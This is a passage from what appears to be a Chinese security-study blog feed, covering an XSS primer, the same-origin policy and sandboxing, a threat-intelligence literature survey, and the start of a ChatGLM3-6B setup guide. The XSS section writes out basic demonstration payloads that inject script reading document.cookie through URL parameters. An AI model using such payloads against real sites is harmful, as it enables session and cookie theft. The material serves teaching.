worm</strong></p><p>通过在标签的style属性上构造XSS蠕虫</p><p>解析：<a href="https://www.cnblogs.com/milantgh/p/3655070.html">https://www.cnblogs.com/milantgh/p/3655070.html</a></p></li><li><p>百度空间蠕虫</p><p>在CSS代码后插入js代码</p><p>解析：<a href="https://blog.csdn.net/qq_33605106/article/details/79756478">https://blog.csdn.net/qq_33605106/article/details/79756478</a></p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』XSS简介</title>
      <link href="/posts/13a2.html"/>
      <url>/posts/13a2.html</url>
      
        <content type="html"><![CDATA[<h1 id="定义与原理"><a class="markdownIt-Anchor" href="#定义与原理"></a> 定义与原理</h1><p>XSS全称是Cross Site Scripting，中文为<strong>跨站脚本攻击</strong>，为了和CSS（层叠样式表（<code>Cascading Style Sheets，CSS</code>））区分命名为XSS。</p><p>XSS的原理：在HTML页面中注入恶意脚本，当目标网站目标用户的浏览器渲染HTML文档时，恶意脚本执行，使得黑客可以控制用户浏览器。</p><p>一个简单的例子：</p><p>有一个网页，会将用户输入的内容回显在页面上。</p><p>如果我们在该网页输入如下脚本，脚本的作用就是弹出一个对话框显示用户的Cookie信息。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果目标服务器没有对这个输入进行检验就直接将其显示在页面上的话，则会生成如下形式的页面代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这段脚本已经成功嵌入到该页面当中。</p><p>当受害浏览器访问这个页面的时候，这段脚本也将被认为是页面的一部分，从而<strong>被执行</strong>，即弹出对话框显示受害浏览器的Cookie信息。</p><h1 id="分类"><a class="markdownIt-Anchor" href="#分类"></a> 分类</h1><p>根据效果的不同，XSS攻击主要可以分为以下几类：</p><h2 id="反射型xss非持久型xss"><a class="markdownIt-Anchor" href="#反射型xss非持久型xss"></a> 反射型XSS（非持久型XSS）</h2><ol><li><p><strong>原理</strong></p><p>一般情况下，黑客发送给别人发送<strong>带有恶意脚本代码参数的 <code>url</code></strong> ，当用户打开这个带有恶意代码参数的 <code>url</code> 地址时，恶意脚本代码作为输入提交到服务器端，服务器端解析后响应，恶意代码被目标服务器通过**错误信息、搜索结果等等方式“反射”**回显在用户的浏览器上，浏览器解析执行XSS代码。</p><blockquote><p>场景：一般会出现在查询类页面等。</p><p>这种网站一般会显示用户的输入，用户点开会恶意代码参数就会显示在网站上并执行。</p></blockquote></li><li><p><strong>特点</strong></p><ul><li>非持久性。攻击脚本不会写入网站的数据库，是一次性的攻击。所以黑客一般需要诱骗用户点击包含攻击脚本的 URL，才能攻击成功。</li><li>需要传递给服务器，通过服务器反射恶意脚本</li></ul></li><li><p><strong>例子</strong></p><p>假设网站有一个搜索功能，该功能接收URL参数中用户提供的搜索词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=gift</span><br></pre></td></tr></table></figure><p>网站在对这个URL的响应中，回显用户提供的搜索词</p><p>假设应用程序不对数据进行任何其他处理，攻击者就可以构造如下的url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其他用户访问这个url的时候，对应渲染出来的html应该为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户的浏览器就会执行script内部的恶意代码</p></li></ol><h2 id="存储型xss持久型xss"><a class="markdownIt-Anchor" href="#存储型xss持久型xss"></a> 存储型XSS（持久型XSS）</h2><ol><li><p><strong>原理</strong></p><p>黑客利用XSS 漏洞，将内容经正常功能提交进入目标服务器端的数据库中并持久保存。当正常用户请求目标页面时，前端页面获得后端从数据库中读出的注入代码，恰好将其渲染执行。</p><blockquote><p>场景：一般存在于 Form 表单提交等交互功能，如发帖留言，注册页面等。</p></blockquote></li><li><p><strong>特点</strong></p><ul><li>稳定性：恶意脚本存入网站服务器端</li></ul></li><li><p><strong>例子</strong></p><p>黑客写下一篇包含有恶意JavaScript 代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。</p></li></ol><h2 id="dom-based型xss"><a class="markdownIt-Anchor" href="#dom-based型xss"></a> DOM-based型XSS</h2><ol><li><p><strong>原理</strong></p><p>从效果来看，DOM-based型XSS也属于反射型，但是其形成的原因比较特殊，所以单独拿出来介绍。</p><p><strong>通过DOM操作前端代码输出</strong>的时候形成的XSS为DOM-based型XSS</p><p>客户端的脚本<strong>通过DOM动态地输出数据到页面</strong>而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行。</p><blockquote><p>场景：一般产生于用户能够进行参数输入查询的地方</p><p><strong>网站本地执行url中的参数而并不传给服务器</strong></p></blockquote></li><li><p><strong>特点</strong></p><ul><li>不与后台服务器产生数据交互</li><li>无法从服务器端进行防御。因为构造的url中的恶意代码参数并不传给服务器，而是客户端获得DOM中的数据直接在本地执行，服务器无法检测到。</li><li>通过客户端脚本在浏览器端触发</li></ul></li><li><p><strong>例子</strong></p><p>有一个网站，包含一个搜索框，用户输入关键字并点击搜索按钮，搜索结果会显示在页面上。网站使用JavaScript来获取URL中的搜索词并将其显示在页面上</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/1637811827_619f06737e8996f4cbccd.png" alt="img" /></p><p>可以看到网站直接通过document.write从url中提取参数并将参数打印在网页上，而并没有将参数传给服务器</p><p>构造url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/#&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用户访问该url时直接本地执行xss代码</p></li></ol><h1 id="xss攻击学习平台"><a class="markdownIt-Anchor" href="#xss攻击学习平台"></a> XSS攻击学习平台</h1><ul><li>Attack API</li><li>BeEF</li><li>XSS-Proxy</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『浏览器安全』浏览器同源策略与沙箱</title>
      <link href="/posts/77ff.html"/>
      <url>/posts/77ff.html</url>
      
        <content type="html"><![CDATA[<h1 id="同源策略"><a class="markdownIt-Anchor" href="#同源策略"></a> 同源策略</h1><h2 id="同源策略的定义"><a class="markdownIt-Anchor" href="#同源策略的定义"></a> 同源策略的定义</h2><p>我们的浏览器出于安全考虑，只允许与<strong>本域</strong>下的接口交互。不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。</p><h2 id="同源策略的应用"><a class="markdownIt-Anchor" href="#同源策略的应用"></a> 同源策略的应用</h2><p>如果没有同源策略，别人就可以轻松的获取我们网站的 cookie 信息， 或是对网页进行DOM操作，可能会造成数据被盗取等后果。</p><p>例如，它可以防止互联网上的恶意网站在浏览器中运行 JS 脚本，从第三方网络邮件服务（用户已登录）或公司内网（因没有公共 IP 地址而受到保护，不会被攻击者直接访问）读取数据，并将这些数据转发给攻击者</p><h2 id="本域与跨域"><a class="markdownIt-Anchor" href="#本域与跨域"></a> 本域与跨域</h2><p>在<strong>同一个协议、主机、端口</strong>下的页面属于同一个域（即本域），否则就是跨域。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240125204517169.png" alt="image-20240125204517169" /></p><blockquote><p>同主机：表示的是主机名相同，而并不是域名。比如上面的例子，第一个例子的主机名为 <code>store.company.com</code> ，最后一个例子的主机名为 <code>news.company.com</code> ，两个例子的主机名不相同，但是域名均为 <code>company.com</code> ，不同源</p></blockquote><p>如果是以下两个链接进行数据交互，可以通过同源策略的检测，允许交互：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.angular.cn:80/guide/inputs-outputs</span><br><span class="line">https://www.angular.cn:80/guide/index</span><br></pre></td></tr></table></figure><p>而如果是以下这样的链接交互数据，则不能通过同源策略的检测：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.child.a.com/test/index.html ----失败，域名不同</span><br><span class="line">https://www.a.com/test/index.html ----失败，协议不同</span><br><span class="line">http://www.a.com:8080/test/index.html ----失败，端口号不同</span><br></pre></td></tr></table></figure><p>所以就会牵引出一个问题，<strong>不同源的数据如何进行交互？</strong></p><h2 id="跨域数据交互问题"><a class="markdownIt-Anchor" href="#跨域数据交互问题"></a> 跨域数据交互问题</h2><p>如何跨域加载资源？</p><ol><li><p><strong>一些特殊的标签</strong></p><p><code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;link&gt;</code> 等标签可以跨域加载资源</p><p>如：可以通过下面的代码访问其他域下的脚本文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>通过jsonp来实现跨域请求</strong></p><ul><li><a href="https://segmentfault.com/a/1190000041946934">JSONP 跨域原理及实现</a></li><li><a href="https://www.cnblogs.com/soyxiaobi/p/9616011.html">彻底弄懂jsonp原理及实现方法</a></li></ul></li><li><p><strong>通过CORS（跨域资源共享）实现跨域请求</strong></p></li><li><p><strong>通过代理实现跨域请求</strong><br />我们都知道同源策略是浏览器自带的，那么我们如果要避免同源策略进行跨域请求，我们可以通过代理服务器的方式进行请求，例如我们请求一个与自身不同域的脚本文件，那么我们可以<strong>先请求与自身同域的一个 url ，然后通过代理服务器进行跳转， 最后返回由代理服务器请求到的脚本文件</strong></p></li></ol><blockquote><p>详细的例子归纳见：<a href="https://blog.csdn.net/l_ppp/article/details/106402136">https://blog.csdn.net/l_ppp/article/details/106402136</a></p></blockquote><h2 id="浏览器第三方插件的同源策略"><a class="markdownIt-Anchor" href="#浏览器第三方插件的同源策略"></a> 浏览器第三方插件的同源策略</h2><p>对于浏览器来说，浏览器加载的一些第三方插件也有各自的同源策略。</p><p>最常见的一些插件如Flash、Java Applet、Silverlight、Google Gears等都有自己的控制策略。</p><h1 id="浏览器沙箱sandbox"><a class="markdownIt-Anchor" href="#浏览器沙箱sandbox"></a> 浏览器沙箱（sandbox）</h1><p>以chrome浏览器为例，采用了<strong>多进程架构</strong>，主要进程包括：浏览器进程、渲染进程、插件进程和拓展进程。插件进程如flash、java、pdf 等与浏览器进程严格隔离，因此不会互相影响。</p><p>渲染引擎由Sandbox隔离，网页代码要与浏览器内核进程或操作系统进行通信都需要通过IPC channel，在其中会进行一些安全检查。</p><p>Sandbox（沙箱）：</p><ul><li><p>原理：Sandbox 的设计目的是为了<strong>让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源。<strong>如果</strong>一定要跨越Sandbox边界产生数据交换，则只能通过指定的数据通道，比如经过封装的API来完成，在这些API中会严格检查请求的合法性</strong>。</p></li><li><p>应用实例：比如一个提供 hosting服务的共享主机环境，假设支持用户上传PHP、Python、Java等语言的代码，为了防止用户代码破坏系统环境，或者是不同用户之间的代码互相影响，则应该设计一个 Sandbox对用户代码进行隔离。Sandbox需要考虑用户代码针对本地文件系统、内存、数据库、网络的可能请求，可以采用默认拒绝的策略，对于有需要的请求，则可以通过封装API的方式实现。</p></li></ul><p>浏览器所加载的一些第三方插件往往不收sandbox管辖，近年来大部分的浏览器漏洞都是<strong>加载第三方插件</strong>导致的。</p><h1 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h1><ul><li><a href="https://www.cnblogs.com/zhengna/p/11428822.html">https://www.cnblogs.com/zhengna/p/11428822.html</a></li><li><a href="https://blog.csdn.net/t0410ch/article/details/125150202">https://blog.csdn.net/t0410ch/article/details/125150202</a></li><li><a href="https://blog.csdn.net/u012861467/article/details/79530629">https://blog.csdn.net/u012861467/article/details/79530629</a></li><li><a href="https://cloud.tencent.com/developer/article/1878652">https://cloud.tencent.com/developer/article/1878652</a></li><li><a href="https://www.cnblogs.com/edisonchou/p/edc_web_security_foundation_notes.html">https://www.cnblogs.com/edisonchou/p/edc_web_security_foundation_notes.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/348948397">https://zhuanlan.zhihu.com/p/348948397</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器安全 </tag>
            
            <tag> 客户端脚本安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『科研』威胁情报领域研究现状总结</title>
      <link href="/posts/155a.html"/>
      <url>/posts/155a.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络攻击信息抽取研究现状"><a class="markdownIt-Anchor" href="#网络攻击信息抽取研究现状"></a> 网络攻击信息抽取研究现状</h1><p>网络安全领域的攻击情报信息抽取，包括：关系抽取、命名实体识别、事件抽取三个方面</p><ul><li><p>CyberEntRel: Joint extraction of cyber entities and relations using deep learning</p><ul><li>期刊：computers &amp; security <strong>CCF-B</strong></li><li>时间：2024</li><li>研究背景：CTI数据的增长速度非常快，现有的技术在提取CTI信息方面逐渐变得无效化</li><li>研究内容：Ahmed等人使用联合提取和关系匹配技术相结合的方法从非结构化文本中提取 CTI，提出了基于RoBERTa-BiGRU-CRF的实体关系提取模型，解决了传统流水线抽取技术的局限性</li></ul></li><li><p>Seqmask: behavior extraction over cyber threat intelligence via multi-instance learning</p><ul><li>期刊：The Computer Journal <strong>CCF-B</strong></li><li>时间：2024</li><li>研究内容：Ge等人提出了一种基于多实例学习（Multi-Instance Learning，MIL）的TTPs提取框架， 根据语义影响评估从CTI 中提取行为关键词，并通过条件概率预测 TTPs 标签。</li></ul></li><li><p>Looking Beyond IoCs: Automatically Extracting Attack Patterns from External CTI</p><ul><li><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/asynccode" alt="img" /></p></li><li><p>RAID’ 23 <strong>CCF-B</strong></p></li><li><p>时间：2023</p></li><li><p>研究背景：传统的 CTI 主要侧重于跟踪已知的威胁指标，如 IP 地址和域名，这可能无法防御不断变化的攻击，需要对攻击模式展开研究</p></li><li><p>研究内容：ALam等人提出了一个威胁情报知识提取框架，从APT攻击和恶意软件相关的CTI中自动提取TTP和其他相关信息，并将提取的攻击模式映射到MITRE ATT&amp;CK模式框架，通过知识图谱重构这些信息以进行进一步的预测分析。是将标准化的 ATT 和 CK 模式与其他形式的威胁情报结合起来的第一项工作。</p></li></ul></li><li><p><strong>Extracting Actionable Cyber Threat Intelligence from Twitter Stream</strong></p><ul><li>2023 IEEE International Conference on Intelligence and Security Informatics (ISI) <strong>CCF-A</strong></li><li>时间：2023</li><li>研究背景：相比于IP、domain此类IOC，恶意活动相关的技术表现形式（和TTPs的“技术”有什么区别吗？）更有利于确定威胁的优先级和系统是否已经被破坏。而此类上下文信息大多存在于实时信息共享系统中，如消息应用程序和论坛。</li><li>研究内容：Purba 等人提出了一种文本挖掘方法，从Twitter流中提取网络威胁攻击的技术表现形式，并和GPT-3.5-Turbo模型计算的结果做了对比 。</li></ul></li><li><p><strong>Explainable cyber threat behavior identification based on self-adversarial topic generation</strong></p><ul><li>Computers &amp; Security <strong>CCF-B</strong></li><li>时间：2023</li><li>研究背景：<ul><li>如何构建一个便捷、高效的分析框架，从 CTI 中识别、定位和证明 TTP 行为，是目前 TTP 分类面临的挑战。</li><li>传统的端到端网络威胁行为识别方法通常缺乏可解释性，难以理解其决策过程。</li></ul></li><li>研究内容：Ge等人提出了一种基于自对抗主题生成的端到端 TTPs 分类框架，在提升准确性的同时具有较高的可解释性。</li></ul></li><li><p>DKaaS: DARK-KERNEL as a service for active cyber threat intelligence</p><ul><li>Computers &amp; Security <strong>CCF-B</strong></li><li>时间：2023</li><li>研究内容：Charan等人提出了一种主动监控暗网收集威胁情报的方法，大量收集暗网流量并 对捕获的数据进行了全面分析。</li></ul></li></ul><h1 id="安全领域知识融合研究现状"><a class="markdownIt-Anchor" href="#安全领域知识融合研究现状"></a> <strong>安全领域知识融合研究现状</strong></h1><p>（1）<strong>构建网络安全知识图谱</strong></p><ul><li>CSKG4APT: A Cybersecurity Knowledge Graph for Advanced Persistent Threat Organization Attribution<ul><li>TKDE <strong>CCF-A</strong></li><li>时间：2022</li><li>Ren等人2022年收集分析开源威胁情报中的APT组织信息，提取相关威胁信息实体，结合战术集、武器集和资产集构建了一个面向APT组织归因的安全知识图谱模型，包含了12种节点类型和7种逻辑关系。</li></ul></li><li>Edge propagation for link prediction in requirement-cyber threat intelligence knowledge graph<ul><li>Information Sciences <strong>CCF-B SCI</strong></li><li>2024</li><li>研究内容：Zhang等人将网络安全威胁情报与关键基础设施的管理安全需求数据相结合，构建异构网络安全需求知识图谱，可以有效识别网络安全事件中的管理漏洞。</li><li>提出了一种基于GNN的链接预测算法，实现了CTI和SR实体之间97%的连接率，可以有效地发现管理漏洞，提高关键信息基础设施的安全能力。</li><li></li></ul></li></ul><p><strong>（2）通用领域的知识融合与实体对齐</strong></p><ul><li>Heterogeneous Knowledge Fusion: A Novel Approach for Personalized Recommendation via LLM<ul><li>RecSys '23: Proceedings of the 17th ACM Conference on Recommender Systems <strong>CCF-B</strong></li><li>时间：2023</li><li>研究内容：Yin等人提出了一种基于大语言模型的知识融合方法，采用大模型从用户的异构行为信息中提取并融合异构知识，解决了传统方法导致的特征稀疏和知识碎片问题。</li></ul></li><li>HiPrompt: Few-Shot Biomedical Knowledge Fusion via Hierarchy-Oriented Prompting<ul><li>In Proceedings of the 46th International ACM SIGIR Conference on Research and Development in Information Retrieval (Short-Paper Track), 2023 <strong>CCF-A</strong></li><li>时间：2023</li><li>研究内容：Lu等人提出了一种监督有效的知识融合框架，通过面向层次的提示引发大语言模型的少样本推理能力，解决了生物医学知识融合任务中缺乏监督数据的问题。</li></ul></li><li>SCMEA: A stacked co-enhanced model for entity alignment based on multi-aspect information fusion and bidirectional contrastive learning<ul><li>2024</li><li>研究背景：大多数现有方法并没有尽可能地挖掘知识图中的隐藏信息。</li><li>研究内容：本文提出了SCMEA，一种基于多方面信息融合和双向对比学习的新型跨语言实体对齐框架。SCMEA最初采用多样化的表示学习模型来嵌入实体的多方面信息，并通过自适应加权机制将它们整合到统一的嵌入空间中，以克服信息缺失和不同方面信息不统一的问题。然后，我们提出了一种堆叠关系实体协同增强模型，以进一步改进实体的表示，其中关系表示是使用具有全局实体注意力的实体收集器来建模的。最后，引入基于改进的双向对比学习的组合损失函数来优化模型参数和实体表示，有效缓解中心问题并加速模型收敛。我们进行了大量的实验来评估 SCMEA 的对齐性能。在五个跨语言数据集上进行的总体实验结果、消融研究和分析表明，我们的模型实现了不同程度的性能改进，并验证了模型的有效性和鲁棒性。</li><li>研究内容：zhou等人提出了一种基于多视角信息融合和双向对比学习的跨语言实体对齐框架，实现了对知识图中隐藏信息的挖掘。</li><li></li></ul></li></ul><h1 id="攻击情报可靠性研判现状"><a class="markdownIt-Anchor" href="#攻击情报可靠性研判现状"></a> <strong>攻击情报可靠性研判现状</strong></h1><p>威胁情报、网络安全线索/事件的真假，质量评估</p><p><strong>（1）国内外目前针对攻击情报源的质量评估、攻击情报的可靠性</strong></p><ul><li>Correlation of cyber threat intelligence with sightings for intelligence assessment and augmentation<ul><li>Computer Networks <strong>CCF-B</strong></li><li>2023</li><li>研究背景：很少有研究评估 CTI 与现实环境中的观察结果（即目击事件）之间的一致性。</li><li>研究内容：Lin等人在2023年对CTI与现实环境中的观察结果之间的一致性展开了研究，提出了一种基于目击观测来评估和增强 CTI 的综合方法，填补了CTI 的评估和增强方面的空白。</li></ul></li></ul><blockquote><p>2023年找不到更好的了，2024年只找到一个中科院三区的，没写上来</p></blockquote><p><strong>（2）通用领域中的虚假新闻检测技术</strong></p><ul><li>Tactics, Threats &amp; Targets: Modeling Disinformation and its Mitigation<ul><li>NDSS <strong>CCF-A</strong></li><li>2023</li><li>研究背景：将网络安全框架应用于理解虚假信息的现状和缓解措施仍然在很大程度上未被探索。作者提议将安全威胁模型应用于虚假信息威胁上，以便更好地将关于虚假信息运动的非结构化信息组织成一种紧凑、结构化的形式，使安全人员可以在有限的资源下有效地应对动态威胁。</li><li>研究内容：Azza A等人提出了一个受网络安全启发的虚假信息威胁分析框架，将安全威胁模型应用于虚假信息领域，系统地定义了虚假信息威胁攻击者的特征、攻击模式、攻击渠道以及攻击目标。</li></ul></li><li>QMFND: A quantum multimodal fusion-based fake news detection model for social media[J].<ul><li>Information Fusion <strong>中科院一区</strong></li><li>2024</li><li>研究内容：Qu等人提出了一种基于量子多模态融合的假新闻检测模型，提取并整合新闻的图像和文本特征，通过量子卷积神经网络（QCNN）获得判别结果，提升了检测性能。</li><li></li></ul></li></ul><h1 id="攻击溯源与图谱推理研究现状"><a class="markdownIt-Anchor" href="#攻击溯源与图谱推理研究现状"></a> <strong>攻击溯源与图谱推理研究现状</strong></h1><p><strong>（1）面向知识图谱的关系推理（通用领域）</strong></p><ul><li><p>AdaProp: Learning Adaptive Propagation for Graph Neural Network based Knowledge Graph Reasoning</p><ul><li>KDD '23: Proceedings of the 29th ACM SIGKDD Conference on Knowledge Discovery and Data Mining <strong>CCF-A</strong></li><li>2023</li><li>研究内容：Zhang等人首次将自适应传播路径的概念引入基于GNN的知识图谱推理任务，实现了对不同查询关系的个性化处理，显著提高了推理的准确性和效率。</li></ul></li><li><p>Neuro-Logic Learning for Relation Reasoning over Event Knowledge Graph</p><ul><li>2023 IEEE International Conference on Intelligence and Security Informatics (ISI) <strong>CCF-A</strong></li><li>2023</li><li>研究背景：现有的推理方法往往集中于实体关系，而没有考虑事件知识图的节点属性，例如事件描述和事件时间，这些属性包含丰富的事件信息，对于事件关系推理至关重要。</li><li>研究内容：Tang等人提出了一种基于神经逻辑学习的事件知识图谱关系推理方法，通过事件元素（例如名称、时间、位置和参与者）和描述来学习事件的分布式表示，弥补了可解释性方面的缺陷</li></ul></li><li><p>HIP network: historical information passing network for extrapolation reasoning on temporal knowledge graph</p><ul><li>Artificial Intelligence (<a href="http://cs.AI">cs.AI</a>) <strong>CCF-A</strong></li><li>2024</li><li>He等人提出了一种“历史信息传递网络（HIP）”模型，从时间、结构和重复性的角度传递历史信息，实现了在时间知识图谱对未来事件的推理和预测。</li></ul></li></ul><p><strong>（2）安全领域的知识图谱推理则更侧重于攻击溯源领域</strong></p><ul><li>Attack Hypotheses Generation Based on Threat Intelligence Knowledge Graph<ul><li>Ieee Transactions On Dependable And Secure Computing <strong>CCF-A</strong></li><li>2023</li><li>研究内容：Kaiser等人提出了一种基于威胁情报知识图谱的攻击假设生成方法，基于知识图谱遍历算法和多种链接预测方法自动推断攻击者使用的 ATT&amp;CK 技术。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 威胁情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『大模型』本地部署chatglm3-6b</title>
      <link href="/posts/d5ac.html"/>
      <url>/posts/d5ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="motivation"><a class="markdownIt-Anchor" href="#motivation"></a> motivation</h1><p>ChatGLM3-6B发布于2023年10月27日，是目前中文能力排名最高的开源LLM模型。对应项目的github地址：<a href="https://github.com/THUDM/ChatGLM3">https://github.com/THUDM/ChatGLM3</a></p><p>实验室项目中需要本地部署大模型用于新闻文本摘要任务，因为预测速度的要求及硬件条件的限制，比较后选择该模型的6B版本。</p><p>本文为在linux环境下的chatglm3-6b的本地部署工程记录。</p><h1 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置"></a> 环境配置</h1><h2 id="cuda与cudnn"><a class="markdownIt-Anchor" href="#cuda与cudnn"></a> CUDA与CUDNN</h2><p>深度学习任务中，当使用GPU进行训练的时候，需要安装英伟达提供的驱动和显卡对应的cuda、cudnn。</p><h3 id="什么是cuda和cudnn"><a class="markdownIt-Anchor" href="#什么是cuda和cudnn"></a> 什么是cuda和cudnn？</h3><ul><li>CUDA(ComputeUnified Device Architecture)：是一种由NVIDIA推出的通用并行计算架构，该架构使GPU能够解决复杂的计算问题。</li><li>CUDNN：是用于深度神经网络的GPU加速库。它强调性能、易用性和低内存开销。NVIDIA cuDNN可以集成到更高级别的机器学习框架中，如谷歌的Tensorflow、torch</li></ul><p>需要注意的是，cuda、cudnn和我们常用的深度学习框架（如tensorflow-gpu、torch-gpu）之间的版本存在对应关系，如果配置错误则代码不能运行。</p><p>我们首先查看服务器上的显卡相关信息，在命令行输入：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><p>可以看到显卡支持的最高CUDA版本为11.8（<strong>注意这里是显卡支持的最高CUDA版本，而并不是目前系统安装的CUDA版本</strong>！）</p><p>同时可以看到这台服务器上装载了两个显存大小都为24G的GPU 0和1，其中GPU 0的显存几乎已经完全占满。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122191115501.png" alt="image-20240122191115501" /></p><p>输入以下命令，查看是否已经安装了cuda：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvcc -V</span><br></pre></td></tr></table></figure><p>如果出现 <code>Command 'nvcc' not found, but can be installed with:</code> 的输出，说明该服务器的系统并没有安装cuda</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122193539449.png" alt="image-20240122193539449" /></p><p>可以看到我这台服务器上面已经安装了cuda，版本为11.8，所以并不需要进行cuda和cudnn的安装</p><p><strong>如果你和我一样已经安装了cuda和cudnn，请跳转到下一部分，进行相对应torch-gpu的安装</strong></p><h3 id="cuda和cudnn的安装"><a class="markdownIt-Anchor" href="#cuda和cudnn的安装"></a> cuda和cudnn的安装</h3><p>这一部分我并没有进行，考虑后续有没有机会补上。</p><p>首先要创建一个Python ≥ 3.10的虚拟环境（chatglm3-6b要求）。</p><p>要注意虚拟环境中的cuda和系统中的cuda的区别，我这里的cuda就是直接安装在系统中，所有的虚拟环境都可以使用系统中安装的cuda</p><p>在虚拟环境中安装并使用其他版本的cuda，参考：<a href="https://blog.csdn.net/2301_80501457/article/details/134191613">https://blog.csdn.net/2301_80501457/article/details/134191613</a></p><blockquote><p>要注意：如果你的cuda是直接安装在虚拟环境中，并非直接安装在系统中。是无法使用ncvv -V命令验证是否安装成功的，ncvv -V是通过系统变量来直接查询，而安装在虚拟环境中并没有直接建立系统变量。验证方法可以见上面链接的最后一部分。</p></blockquote><h2 id="pytorch-gpu的安装"><a class="markdownIt-Anchor" href="#pytorch-gpu的安装"></a> 